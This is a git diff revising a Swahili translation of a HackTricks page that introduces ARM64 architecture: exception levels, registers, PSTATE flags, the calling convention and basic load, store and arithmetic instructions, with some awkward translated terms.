@@ -2,166 +2,255 @@
 
 <details>
 
-<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>
 
 Njia nyingine za kusaidia HackTricks:
 
-* Ikiwa unataka kuona **kampuni yako inatangazwa kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
-* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
-* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
-* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Shiriki mbinu zako za kudukua kwa kuwasilisha PR kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
+* Ikiwa unataka kuona **kampuni yako ikionekana kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
+* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
+* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
+* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
 
 ## **Viwango vya Kipekee - EL (ARM64v8)**
 
-Katika usanifu wa ARMv8, viwango vya utekelezaji, vinavyojulikana kama Viwango vya Kipekee (ELs), vinadefinisha kiwango cha uwezo na uwezo wa mazingira ya utekelezaji. Kuna viwango vinne vya kipekee, kuanzia EL0 hadi EL3, kila kimoja kikitumika kwa kusudi tofauti:
+Katika usanifu wa ARMv8, viwango vya utekelezaji, vinavyoitwa Viwango vya Kipekee (ELs), vinataja kiwango cha uwezo na uwezo wa mazingira ya utekelezaji. Kuna viwango vinne vya kipekee, kuanzia EL0 hadi EL3, kila kimoja kikitoa lengo tofauti:
 
-1. **EL0 - Njia ya Mtumiaji**:
-* Hii ni kiwango cha chini cha uwezo na hutumiwa kwa utekelezaji wa nambari za programu za kawaida.
-* Programu zinazoendesha kwenye EL0 zimejitenga kutoka kila mmoja na kutoka kwa programu ya mfumo, kuimarisha usalama na utulivu.
-2. **EL1 - Njia ya Msingi ya Mfumo wa Uendeshaji**:
-* Zaidi ya mfumo wa uendeshaji wa msingi hufanya kazi kwenye kiwango hiki.
-* EL1 ina uwezo zaidi kuliko EL0 na inaweza kupata rasilimali za mfumo, lakini kwa mipaka fulani ili kuhakikisha usalama wa mfumo.
-3. **EL2 - Njia ya Hypervisor**:
-* Kiwango hiki hutumiwa kwa utekelezaji wa kivinjari. Kivinjari kinachofanya kazi kwenye EL2 kinaweza kusimamia mifumo ya uendeshaji mingi (kila moja katika EL1 yake) inayofanya kazi kwenye vifaa vya kimwili sawa.
-* EL2 hutoa huduma za kujitenga na kudhibiti mazingira yaliyovinjariwa.
-4. **EL3 - Njia ya Monitor ya Salama**:
-* Hii ni kiwango cha juu cha uwezo na mara nyingi hutumiwa kwa kuanzisha salama na mazingira ya utekelezaji yanayoweaminika.
-* EL3 inaweza kusimamia na kudhibiti ufikiaji kati ya hali salama na zisizo salama (kama vile kuanzisha salama, OS iliyoaminika, nk).
+1. **EL0 - Hali ya Mtumiaji**:
+* Hii ni kiwango cha chini cha uwezo na hutumiwa kutekeleza nambari za maombi ya kawaida.
+* Programu zinazoendesha kwenye EL0 zimejitenga kutoka kwa nyingine na kutoka kwa programu ya mfumo, ikiboresha usalama na utulivu.
+2. **EL1 - Hali ya Msingi ya Mfumo wa Uendeshaji**:
+* Zaidi ya majitu ya mfumo wa uendeshaji hufanya kazi kwenye kiwango hiki.
+* EL1 ina uwezo zaidi kuliko EL0 na inaweza kupata rasilimali za mfumo, lakini kwa vizuizi fulani kuhakikisha uadilifu wa mfumo.
+3. **EL2 - Hali ya Hypervisor**:
+* Kiwango hiki hutumiwa kwa uvirtualization. Hypervisor inayotekelezwa kwenye EL2 inaweza kusimamia mifumo ya uendeshaji mingi (kila moja katika EL1 yake) ikifanya kazi kwenye vifaa vya kimwili sawa.
+* EL2 hutoa vipengele vya kujitenga na kudhibiti mazingira vilivyovirtualized.
+4. **EL3 - Hali ya Kufuatilia Salama**:
+* Hii ni kiwango cha juu zaidi cha uwezo na mara nyingi hutumiwa kwa kuanzisha salama na mazingira ya utekelezaji yanayoweza kudhibitika.
+* EL3 inaweza kusimamia na kudhibiti ufikiaji kati ya hali salama na zisizo salama (kama vile kuanzisha salama, OS iliyothibitishwa, n.k.).
 
-Matumizi ya viwango hivi inaruhusu njia iliyopangwa na salama ya kusimamia vipengele tofauti vya mfumo, kutoka kwa programu za mtumiaji hadi programu ya mfumo yenye uwezo mkubwa zaidi. Njia ya ARMv8 ya viwango vya uwezo husaidia katika kujitenga kwa ufanisi sehemu tofauti za mfumo, hivyo kuimarisha usalama na nguvu ya mfumo.
+Matumizi ya viwango hivi hutoa njia iliyopangwa na salama ya kusimamia vipengele tofauti vya mfumo, kutoka kwa maombi ya mtumiaji hadi programu ya mfumo yenye uwezo zaidi. Mbinu ya ARMv8 kwa viwango vya uwezo husaidia katika kujitenga kwa ufanisi sehemu tofauti za mfumo, hivyo kuboresha usalama na uthabiti wa mfumo.
 
-## **Vidokezo (ARM64v8)**
+## **Vidhibiti (ARM64v8)**
 
-ARM64 ina **registri 31 za kawaida**, zilizopewa majina `x0` hadi `x30`. Kila moja inaweza kuhifadhi thamani ya **biti 64** (baiti 8). Kwa operesheni zinazohitaji thamani za biti 32 tu, registri sawa zinaweza kufikiwa katika hali ya biti 32 kwa kutumia majina w0 hadi w30.
+ARM64 ina **vidhibiti vya jumla vya 31**, vilivyopewa majina `x0` hadi `x30`. Kila moja inaweza kuhifadhi thamani ya **64-bit** (baiti 8). Kwa operesheni zinazohitaji thamani za biti 32 tu, vidhibiti sawa vinaweza kupatikana katika hali ya biti 32 kwa kutumia majina w0 hadi w30.
 
-1. **`x0`** hadi **`x7`** - Kawaida hutumiwa kama registri za muda na kwa kusambaza parameta kwa subroutines.
+1. **`x0`** hadi **`x7`** - Kawaida hutumiwa kama vidhibiti vya muda na kwa kupitisha parameta kwa subroutines.
 * **`x0`** pia inabeba data ya kurudi ya kazi
-2. **`x8`** - Katika kernel ya Linux, `x8` hutumiwa kama nambari ya wito wa mfumo kwa maelekezo ya `svc`. **Katika macOS x16 ndiyo inayotumiwa!**
-3. **`x9`** hadi **`x15`** - Registri za muda zaidi, mara nyingi hutumiwa kwa ajili ya pembejeo za ndani.
-4. **`x16`** na **`x17`** - **Registri za Wito za Ndani-Procedure**. Registri za muda kwa thamani za papo hapo. Pia hutumiwa kwa wito wa kazi zisizo za moja kwa moja na stubs za PLT (Procedure Linkage Table).
+2. **`x8`** - Katika kernel ya Linux, `x8` hutumiwa kama nambari ya wito wa mfumo kwa maelekezo ya `svc`. **Katika macOS x16 ndio hutumiwa!**
+3. **`x9`** hadi **`x15`** - Vidhibiti vya muda zaidi, mara nyingi hutumiwa kwa vidhibiti vya mitaa.
+4. **`x16`** na **`x17`** - **Vidhibiti vya Wito wa Ndani wa Mchakato**. Vidhibiti vya muda kwa thamani za moja kwa moja. Pia hutumiwa kwa wito wa kazi za moja kwa moja na PLT (Procedure Linkage Table) stubs.
 * **`x16`** hutumiwa kama **nambari ya wito wa mfumo** kwa maelekezo ya **`svc`** katika **macOS**.
-5. **`x18`** - **Registri ya Jukwaa**. Inaweza kutumika kama registri ya kawaida, lakini kwenye majukwaa fulani, registri hii imehifadhiwa kwa matumizi maalum ya jukwaa: Kionjo cha kizuizi cha mazingira ya wakati wa sasa katika Windows, au kuashiria muundo wa kazi inayotekelezwa kwa sasa katika kernel ya Linux.
-6. **`x19`** hadi **`x28`** - Hizi ni registri zilizohifadhiwa kwa wito. Kazi lazima ihifadhi thamani za registri hizi kwa mtumiaji wake, kwa hivyo zinahifadhiwa kwenye steki na kurejeshwa kabla ya kurudi kwa mtumiaji.
-7. **`x29`** - **Registri ya Mwongozo wa Fremu** inayotumika kufuatilia fremu ya steki. Wakati fremu mpya ya steki inaundwa kwa sababu wito wa kazi umefanywa, **`x29`** inahifadhiwa kwenye steki na anwani mpya ya fremu (**anwani ya `sp`**) inahifadhiwa kwenye usajili huu.
-* Usajili huu pia unaweza kutumika kama **usajili wa kawaida** ingawa kawaida hutumiwa kama kumbukumbu ya **pembejeo za ndani**.
-8. **`x30`** au **`lr`**- **Usajili wa Kiungo**. Unashikilia anwani ya kurudi wakati maelekezo ya `BL` (Branch with Link) au `BLR` (Branch with Link to Register) yanatekelezwa kwa kuhifadhi thamani ya **`pc`** kwenye usajili huu.
-* Pia unaweza kutumika kama usajili mwingine wowote.
-9. **`sp`** - **Usajili wa Kionjo**, hutumiwa kufuatilia kilele cha steki.
-* thamani ya **`sp`** lazima iwe angalau **quadword
+5. **`x18`** - **Kudhibiti jukwaa**. Inaweza kutumika kama kudhibiti wa jumla, lakini kwenye majukwaa fulani, kudhibiti huu unahifadhiwa kwa matumizi maalum ya jukwaa: Kielekezi kwa kizuizi cha mazingira cha wakati wa sasa katika Windows, au kuelekeza kwa muundo wa kazi inayoendeshwa kwa sasa katika kernel ya Linux.
+6. **`x19`** hadi **`x28`** - Hizi ni vidhibiti vinavyohifadhiwa kwa wito. Kazi lazima ihifadhi thamani za vidhibiti hivi kwa mpigaji wake, hivyo huhifadhiwa kwenye steki na kurejeshwa kabla ya kurudi kwa mpigaji.
+7. **`x29`** - **Kielekezi cha Fremu** kufuatilia fremu ya steki. Wakati fremu mpya ya steki inaundwa kwa sababu kazi inaitwa, kudhibiti cha **`x29`** kina **hifadhiwa kwenye steki** na anwani mpya ya fremu (**anwani ya `sp`**) inahifadhiwa kwenye kielekezi hiki.
+* Kudhibiti hiki pia kinaweza kutumika kama **kielekezi cha jumla** ingawa kawaida hutumiwa kama kumbukumbu ya **vidhibiti vya mitaa**.
+8. **`x30`** au **`lr`**- **Kielekezi cha Kiungo**. Huhifadhi **anwani ya kurudi** wakati maelekezo ya `BL` (Branch with Link) au `BLR` (Branch with Link to Register) yanatekelezwa kwa kuhifadhi thamani ya **`pc`** kwenye kielekezi hiki.
+* Pia inaweza kutumika kama kudhibiti kingine chochote.
+9. **`sp`** - **Kielekezi cha Staki**, hutumiwa kufuatilia juu ya steki.
+* thamani ya **`sp`** daima inapaswa kuhifadhiwa angalau kwa **alinamento ya quadword** au kutokea kwa kosa la alinamento.
+10. **`pc`** - **Kielekezi cha Programu**, kinachoelekeza kwa maelekezo yanayofuata. Kudhibiti hiki kinaweza kusasishwa kupitia kizazi cha kipekee cha maelekezo, kurudi kwa kipekee, na matawi. Maelekezo ya kawaida pekee yanayoweza kusoma kudhibiti hiki ni maelekezo ya matawi na viungo (BL, BLR) kuhifadhi anwani ya **`pc`** kwenye **`lr`** (Kielekezi cha Kiungo).
+11. **`xzr`** - **Kudhibiti cha Sifuri**. Pia huitwa **`wzr`** katika fomu yake ya kudhibiti ya biti **32**. Inaweza kutumika kupata thamani ya sifuri kwa urahisi (operesheni ya kawaida) au kufanya mlinganisho kwa kutumia **`subs`** kama **`subs XZR, Xn, #10`** kuhifadhi data inayopatikana mahali popote (katika **`xzr`**).
+
+Vidhibiti vya **`Wn`** ni toleo la **32bit** la kudhibiti la **`Xn`**.
+
+### Vidhibiti vya SIMD na Floating-Point
+
+Zaidi ya hayo, kuna vidhibiti vingine **32 vya urefu wa biti 128** vinavyoweza kutumika katika operesheni za SIMD zilizooanishwa na data nyingi na kwa kufanya hesabu ya nukta ya kuogelea. Hivi huitwa vidhibiti vya Vn ingawa wanaweza pia kufanya kazi katika **64**-bit, **32**-bit, **16**-bit na **8**-bit na kisha huitwa **`Qn`**, **`Dn`**, **`Sn`**, **`Hn`** na **`Bn`**.
+
+### Vidhibiti vya Mfumo
+
+**Kuna vidhibiti vingi vya mfumo**, pia huitwa vidhibiti maalum (SPRs), hutumiwa kwa **kuangalia** na **kudhibiti** **tabia za processors**.\
+Vinaweza kusomwa au kuwekwa tu kwa kutumia maelekezo maalum ya kipekee **`mrs`** na **`msr`**.
+
+Vidhibiti maalum **`TPIDR_EL0`** na **`TPIDDR_EL0`** mara nyingi hupatikana wakati wa kugeuza. Kiambishi cha `EL0` kinaonyesha **kipekee cha chini** ambacho kudhibiti kinaweza kupatikana nacho (katika kesi hii EL0 ni kiwango cha kawaida cha kipekee (uwezo) ambacho programu za kawaida hufanya kazi nacho).\
+Maranyingi hutumiwa kuhifadhi **anwani ya msingi ya eneo la kuhifadhi la mnyororo wa watumiaji**. Kawaida la kwanza linaweza kusomwa na kuandikwa na programu zinazoendesha katika EL0, lakini la pili linaweza kusomwa kutoka EL0 na kuandikwa kutoka EL1 (kama kernel).
+
+* `mrs x0, TPIDR_EL0 ; Soma TPIDR_EL0 kwenye x0`
+* `msr TPIDR_EL0, X0 ; Andika x0 kwenye TPIDR_EL0`
 ### **PSTATE**
 
-**PSTATE** ina sehemu kadhaa za mchakato zilizosanifishwa katika usajili maalum wa **`SPSR_ELx`** unaoweza kuonekana na mfumo wa uendeshaji, X ikiwa ni **kiwango cha ruhusa cha kosa** kilichosababisha (hii inaruhusu kurejesha hali ya mchakato wakati kosa linamalizika).\
+**PSTATE** ina vifaa vingi vya mchakato vilivyosawazishwa katika **`SPSR_ELx`** special register inayoonekana na mfumo wa uendeshaji, X ikiwa ni **kiwango cha ruhusa ya kipekee** ya kosa lililosababisha (hii inaruhusu kurejesha hali ya mchakato wakati kosa linamalizika).\
 Hizi ni sehemu zinazopatikana:
 
 <figure><img src="../../../.gitbook/assets/image (724).png" alt=""><figcaption></figcaption></figure>
 
-* **`N`**, **`Z`**, **`C`**, na **`V`** hali za hali:
-* **`N`** inamaanisha uendeshaji ulitoa matokeo hasi
-* **`Z`** inamaanisha uendeshaji ulitoa sifuri
-* **`C`** inamaanisha uendeshaji ulibeba
-* **`V`** inamaanisha uendeshaji ulitoa kipeo kilichosainiwa:
-* Jumla ya nambari mbili chanya inatoa matokeo hasi.
-* Jumla ya nambari mbili hasi inatoa matokeo chanya.
-* Katika kutoa, wakati nambari kubwa hasi inaondolewa kutoka kwa nambari ndogo chanya (au kinyume chake), na matokeo hayawezi kuwakilishwa ndani ya upeo wa ukubwa wa biti uliopewa.
+* **`N`**, **`Z`**, **`C`** na **`V`** hali ya masharti:
+* **`N`** inamaanisha operesheni ilizalisha matokeo hasi
+* **`Z`** inamaanisha operesheni ilizalisha sifuri
+* **`C`** inamaanisha operesheni ilibeba
+* **`V`** inamaanisha operesheni ilizalisha kipindupindu kilichosainiwa:
+* Jumla ya nambari mbili chanya inazalisha matokeo hasi.
+* Jumla ya nambari mbili hasi inazalisha matokeo chanya.
+* Katika upunguzaji, wakati nambari kubwa hasi inapunguzwa kutoka kwa nambari ndogo chanya (au kinyume chake), na matokeo hayawezi kuwakilishwa ndani ya safu ya ukubwa wa biti iliyotolewa.
+* Kwa dhahiri, processor hajui operesheni ni ya kusainiwa au la, kwa hivyo itachunguza C na V katika operesheni na kuonyesha ikiwa kuna kubeba ilitokea ikiwa ilikuwa ya kusainiwa au la.
 
 {% hint style="warning" %}
-Sio maagizo yote yanayosasisha alama hizi. Baadhi kama **`CMP`** au **`TST`** hufanya hivyo, na wengine ambao wana kifupi cha s kama **`ADDS`** pia hufanya hivyo.
+Sio maagizo yote yanayosasisha hizi bendera. Baadhi kama **`CMP`** au **`TST`** hufanya, na zingine zenye kitenzi cha s kama **`ADDS`** pia hufanya hivyo.
 {% endhint %}
 
-* Bendera ya sasa ya **urefu wa usajili (`nRW`)**: Ikiwa bendera inashikilia thamani 0, programu itaendeshwa katika hali ya utekelezaji wa AArch64 mara tu inapoendelea.
-* **Kiango cha Kosa cha Sasa** (**`EL`**): Programu ya kawaida inayoendesha katika EL0 itakuwa na thamani 0
-* Bendera ya **hatua moja** (**`SS`**): Inatumika na wadukuzi wa kuchunguza hatua moja kwa kuweka bendera ya SS kuwa 1 ndani ya **`SPSR_ELx`** kupitia kosa. Programu itaendesha hatua na kutoa kosa la hatua moja.
-* Bendera ya hali ya kosa **isiyofaa** (**`IL`**): Inatumika kuashiria wakati programu yenye ruhusa inatekeleza uhamisho wa kiwango cha kosa usiofaa, bendera hii inawekwa kuwa 1 na kiprocessa kinasababisha kosa la hali isiyofaa.
-* Bendera za **`DAIF`**: Bendera hizi huruhusu programu yenye ruhusa kuficha kwa hiari baadhi ya kosa za nje.
-* Ikiwa **`A`** ni 1 inamaanisha **kukatika kwa ghafla** kutazinduliwa. **`I`** inaendeleza kujibu ombi za **Kuingilia za Vifaa vya Nje** (IRQs). na F inahusiana na **Ombi za Kuingilia za Haraka** (FIRs).
-* Bendera za kuchagua za **chagua kidole cha staha** (**`SPS`**): Programu zenye ruhusa zinazoendesha katika EL1 na zaidi zinaweza kubadilishana kati ya kutumia usajili wao wa kidole cha staha na wa mfano wa mtumiaji (kwa mfano, kati ya `SP_EL1` na `EL0`). Hii inafanywa kwa kuandika kwenye usajili maalum wa **`SPSel`**. Hii haiwezi kufanywa kutoka EL0.
+* **Bendera ya upana wa sasa wa usajili (`nRW`)**: Ikiwa bendera inashikilia thamani 0, programu itaendesha katika hali ya utekelezaji wa AArch64 mara tu itakaporejeshwa.
+* **Kiweko cha Kosa la Sasa** (**`EL`**): Programu ya kawaida inayoendesha katika EL0 itakuwa na thamani 0
+* Bendera ya **hatua moja** (**`SS`**): Hutumiwa na wachunguzi wa kosa la hatua moja kwa kuweka bendera ya SS kuwa 1 ndani ya **`SPSR_ELx`** kupitia kosa. Programu itaendesha hatua na kutoa kosa la hatua moja.
+* Bendera ya hali ya kosa **isiyo halali** (**`IL`**): Hutumiwa kuashiria wakati programu yenye ruhusa inafanya uhamisho wa kiwango cha kosa lisilo halali, bendera hii inawekwa kuwa 1 na processor kuzindua kosa la hali lisilo halali.
+* Bendera za **`DAIF`**: Bendera hizi huruhusu programu yenye ruhusa kuficha kwa hiari baadhi ya kosa la nje.
+* Ikiwa **`A`** ni 1 inamaanisha **kuzinduliwa kwa kushtukiza** kutafanyika. **`I`** inaconfigure kujibu kwa **Ombi la Kuingilia la Vifaa vya Nje** (IRQs). na F inahusiana na **Ombi za Kuingilia za Haraka** (FIRs).
+* Bendera za kuchagua **chagua kidole cha steki** (**`SPS`**): Programu zenye ruhusa zinazoendesha katika EL1 na zaidi zinaweza kubadilisha kati ya kutumia usajili wao wa kidole cha steki na wa mtumiaji (k.m. kati ya `SP_EL1` na `EL0`). Hii kubadilishana hufanywa kwa kuandika kwa usajili maalum wa **`SPSel`**. Hii haiwezi kufanywa kutoka EL0.
 
-## **Mfumo wa Wito (ARM64v8)**
+## **Mkataba wa Kuita (ARM64v8)**
 
-Mfumo wa wito wa ARM64 unabainisha kuwa **parameta nane za kwanza** kwa kazi hutumwa kwenye usajili **`x0`** hadi **`x7`**. **Parameta zaidi** hutumwa kwenye **staha**. Thamani ya **kurudi** inatumwa kwenye usajili **`x0`**, au pia kwenye **`x1`** ikiwa ina bits 128. Usajili wa **`x19`** hadi **`x30`** na **`sp`** lazima zihifadhiwe kati ya wito wa kazi.
+Mkataba wa kuita wa ARM64 unabainisha kwamba **parameta nane za kwanza** kwa kazi hutumwa katika usajili **`x0` hadi `x7`**. **Parameta zaidi** hutumwa kwenye **steki**. Thamani ya **kurudi** hutumwa tena katika usajili **`x0`**, au pia katika **`x1`** ikiwa ni **biti 128 ndefu**. Usajili wa **`x19`** hadi **`x30`** na **`sp`** lazima zihifadhiwe kote kwenye wito wa kazi.
 
-Unaposoma kazi katika mkusanyiko, tafuta **prologue na epilogue** ya kazi. **Prologue** kawaida inahusisha **kuhifadhi kigezo cha fremu (`x29`)**, **kuweka** kigezo cha **fremu mpya**, na **kuweka nafasi ya staha**. **Epilogue** kawaida inahusisha **kurudisha kigezo cha fremu kilichohifadhiwa** na **kurudi** kutoka kwa kazi.
+Unaposoma kazi katika mkusanyiko, tafuta **prologue na epilogue** ya kazi. **Prologue** kawaida inahusisha **kuhifadhi kidole cha fremu (`x29`)**, **kuweka** kidole cha **fremu mpya**, na **kutenga nafasi ya steki**. **Epilogue** kawaida inahusisha **kurudisha kidole cha fremu kilichohifadhiwa** na **kurudi** kutoka kwa kazi.
 
-### Mfumo wa Wito katika Swift
+### Mkataba wa Kuita katika Swift
 
-Swift ina mfumo wake wa wito wa **kipekee** ambao unaweza kupatikana katika [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64)
+Swift ina **mkataba wake wa kuita** ambao unaweza kupatikana katika [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64)
 
 ## **Maagizo ya Kawaida (ARM64v8)**
 
-Maagizo ya ARM64 kwa ujumla yana **muundo wa `opcode dst, src1, src2`**, ambapo **`opcode`** ni **operesheni** itakayotekelezwa (kama vile `add`, `sub`, `mov`, nk), **`dst`** ni usajili wa **marudio** ambapo matokeo yatahifadhiwa, na **`src1`** na **`src2`** ni usajili wa **chanzo**. Thamani za moja kwa moja pia zinaweza kutumiwa badala ya usajili wa chanzo.
+Maagizo ya ARM64 kwa ujumla yana **muundo wa `opcode dst, src1, src2`**, ambapo **`opcode`** ni **operesheni** itakayotekelezwa (kama vile `add`, `sub`, `mov`, nk.), **`dst`** ni usajili wa **marudio** ambapo matokeo yatahifadhiwa, na **`src1`** na **`src2`** ni usajili wa **chanzo**. Thamani za mara moja pia zinaweza kutumika mahali pa usajili wa chanzo.
 
 * **`mov`**: **Hamisha** thamani kutoka kwa **usajili** mmoja hadi mwingine.
-* Mfano: `mov x0, x1` - Hii inahamisha thamani kutoka `x1` hadi `x0`.
+* Mfano: `mov x0, x1` — Hii inahamisha thamani kutoka `x1` hadi `x0`.
 * **`ldr`**: **Pakia** thamani kutoka **kumbukumbu** hadi **usajili**.
-* Mfano: `ldr x0, [x1]` - Hii inapakia thamani kutoka eneo la kumbukumbu linaloelekezwa na `x1` hadi `x0`.
-* **`str`**: **Hifadhi** thamani kutoka kwa **usajili** hadi **kumbukumbu**.
-* Mfano: `str x0, [x1]` - Hii inahifadhi thamani katika `x0` kwenye eneo la kumbukumbu linaloelekezwa na `x1`.
-* **`ldp`**: **Pakia Jozi ya Usajili**. Maagizo haya **yanapakia usajili mbili** kutoka kwa **eneo la kumbukumbu** lililopo mfululizo. Anwani ya kumbukumbu kawaida hufanywa kwa kuongeza mbadala kwa thamani katika usajili mwingine.
-* Mfano: `ldp x0, x1, [x2]` - Hii inapakia `x0` na `x1` kutoka eneo la kumbukumbu kwenye `x2` na `x2 + 8
-* **`bfm`**: **Bit Filed Move**, hizi operesheni **hukopi bits `0...n`** kutoka kwa thamani na kuziweka katika nafasi **`m..m+n`**. **`#s`** inabainisha nafasi ya **bit ya kushoto** na **`#r`** kiasi cha **kuzungusha kulia**.
-* Hoja ya Bitfiled: `BFM Xd, Xn, #r`
-* Hoja ya Bitfiled yenye Ishara: `SBFM Xd, Xn, #r, #s`
-* Hoja ya Bitfiled isiyo na Ishara: `UBFM Xd, Xn, #r, #s`
-* **Kuchukua na Kuingiza Bitfield:** Hukopi bitfield kutoka kwenye usajili na kuziweka kwenye usajili mwingine.
-* **`BFI X1, X2, #3, #4`** Weka bits 4 kutoka X2 kutoka bit ya 3 ya X1
-* **`BFXIL X1, X2, #3, #4`** Chukua kutoka bit ya 3 ya X2 bits nne na uzihifadhi kwenye X1
-* **`SBFIZ X1, X2, #3, #4`** Inapanua ishara ya bits 4 kutoka X2 na kuziweka kwenye X1 kuanzia nafasi ya bit 3 na kuzifanya bits za kulia kuwa sifuri
-* **`SBFX X1, X2, #3, #4`** Inachukua bits 4 kuanzia bit ya 3 kutoka X2, inapanua ishara yao, na kuweka matokeo kwenye X1
-* **`UBFIZ X1, X2, #3, #4`** Inapanua sifuri ya bits 4 kutoka X2 na kuziweka kwenye X1 kuanzia nafasi ya bit 3 na kuzifanya bits za kulia kuwa sifuri
-* **`UBFX X1, X2, #3, #4`** Inachukua bits 4 kuanzia bit ya 3 kutoka X2 na kuweka matokeo ya sifuri kwenye X1.
-* **Panua Ishara Kwenda X:** Inapanua ishara (au kuongeza tu sifuri katika toleo lisilo na ishara) ya thamani ili kuweza kufanya operesheni nayo:
-* **`SXTB X1, W2`** Inapanua ishara ya byte **kutoka W2 hadi X1** (`W2` ni nusu ya `X2`) ili kujaza bits 64
-* **`SXTH X1, W2`** Inapanua ishara ya nambari ya 16bit **kutoka W2 hadi X1** ili kujaza bits 64
-* **`SXTW X1, W2`** Inapanua ishara ya byte **kutoka W2 hadi X1** ili kujaza bits 64
-* **`UXTB X1, W2`** Inaongeza sifuri (isio na ishara) kwa byte **kutoka W2 hadi X1** ili kujaza bits 64
-* **`extr`:** Inachukua bits kutoka kwa **jozi ya usajili uliyounganishwa**.
-* Mfano: `EXTR W3, W2, W1, #3` Hii ita**unganisha W1+W2** na kupata **kutoka bit ya 3 ya W2 hadi bit ya 3 ya W1** na kuihifadhi kwenye W3.
-* **`bl`**: **Branch** na kiungo, hutumiwa ku**ita** **sehemu ndogo**. Inahifadhi **anwani ya kurudi katika `x30`**.
+* Mfano: `ldr x0, [x1]` — Hii inapakia thamani kutoka kwenye eneo la kumbukumbu linaloelekezwa na `x1` ndani ya `x0`.
+* **Hali ya Offset**: Offset inayoathiri kidole cha asili inaonyeshwa, kwa mfano:
+* `ldr x2, [x1, #8]`, hii itapakia katika x2 thamani kutoka x1 + 8
+* &#x20;`ldr x2, [x0, x1, lsl #2]`, hii itapakia katika x2 kitu kutoka kwenye safu x0, kutoka kwenye nafasi x1 (indeksi) \* 4
+* **Hali ya Kabla ya Indeksi**: Hii itatumia hesabu kwa asili, kupata matokeo na pia kuhifadhi asili mpya katika asili.
+* `ldr x2, [x1, #8]!`, hii itapakia `x1 + 8` katika `x2` na kuhifadhi katika x1 matokeo ya `x1 + 8`
+* `str lr, [sp, #-4]!`, Hifadhi kidole cha kiungo katika sp na sasisha usajili wa sp
+* **Hali ya Baada ya Indeksi**: Hii ni kama ile ya awali lakini anwani ya kumbukumbu inafikiwa kisha offset inahesabiwa na kuhifadhiwa.
+* `ldr x0, [x1], #8`, pakia `x1` katika `x0` na sasisha x1 na `x1 + 8`
+* **Kuwasilisha kwa PC-relative**: Katika kesi hii anwani ya kupakia inahesabiwa kulingana na usajili wa PC
+* `ldr x1, =_start`, Hii itapakia anwani ambapo ishara ya `_start` inaanza katika x1 inayohusiana na PC ya sasa.
+* **`str`**: **Hifadhi** thamani kutoka kwa **usajili** katika **kumbukumbu**.
+* Mfano: `str x0, [x1]` — Hii inahifadhi thamani katika `x0` katika eneo la kumbukumbu linaloelekezwa na `x1`.
+* **`ldp`**: **Pakia Jozi ya Usajili**. Maagizo haya **hupakia usajili mbili** kutoka kwa **eneo la kumbukumbu** za mfululizo. Anwani ya kumbukumbu kawaida hufanywa kwa kuongeza offset kwa thamani katika usajili mwingine.
+* Mfano: `ldp x0, x1, [x2]` — Hii inapakia `x0` na `x1` kutoka kwenye maeneo ya kumbukumbu kwenye `x2` na `x2 + 8`, mtawalia.
+* **`stp`**: **Hifadhi Jozi ya Usajili**. Maagizo haya **huhifadhi usajili mbili** kwa **eneo la kumbukumbu** za mfululizo. Anwani ya kumbukumbu kawaida hufanywa kwa kuongeza offset kwa thamani katika usajili mwingine.
+* Mfano: `stp x0, x1, [sp]` — Hii inahifadhi `x0` na `x1` kwenye maeneo ya kumbukumbu kwenye `sp` na `sp + 8`, mtawalia.
+* `stp x0, x1, [sp, #16]!` — Hii inahifadhi `x0` na `x1` kwenye maeneo ya kumbukumbu kwenye `sp+16` na `sp + 24`, mtawalia, na kusasisha `sp` na `sp+16`.
+* **`add`**: **Ongeza** thamani za usajili mbili na uhifadhi matokeo katika usajili.
+* Sintaksi: ongeza(s) Xn1, Xn2, Xn3 | #imm, \[shift #N | RRX]
+* Xn1 -> Marudio
+* Xn2 -> Operandi 1
+* Xn3 | #imm -> Operandi 2 (usajili au mara moja)
+* \[shift #N | RRX] -> Fanya mabadiliko au piga simu ya RRX
+* Mfano: `add x0, x1, x2` — Hii inaongeza thamani katika `x1` na `x2` pamoja na kuhifadhi matokeo katika `x0`.
+* `add x5, x5, #1, lsl #12` — Hii inalingana na 4096 (1 inayobadilishwa mara 12) -> 1 0000 0000 0000 0000
+* **`adds`** Hii hufanya `ongeza` na kusasisha bendera
+* **`sub`**: **Punguza** thamani za usajili mbili na uhifadhi matokeo katika usajili.
+* Angalia **sintaksi ya** **`add`**.
